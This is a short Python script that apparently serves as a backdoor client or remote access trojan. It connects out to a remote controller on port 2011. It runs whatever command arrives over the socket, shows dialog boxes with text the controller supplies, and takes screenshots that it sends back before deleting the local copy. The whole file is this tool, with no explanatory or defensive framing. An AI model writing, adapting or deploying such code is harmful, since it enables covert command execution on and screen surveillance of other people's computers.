import socket
import subprocess

HOST = ''
PORT = 2011
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
	data = s.recv(2048)
	lst = data.decode().split()
	if (lst[0] == 'zenity'):
		message = '--text='
		for i in range(1, len(lst)):
			message += lst[i] + ' '
		subprocess.run(['zenity', '--question', message])
		continue
	if (lst[0] == 'gnome-screenshot'):
		subprocess.run(data.decode().split())
		with open('screenshot.jpg', 'rb') as file:
			img = file.read()
			s.send(img)
		subprocess.run(['rm', '-f', 'screenshot.jpg'])
		continue
	subprocess.run(data.decode().split())
s.close()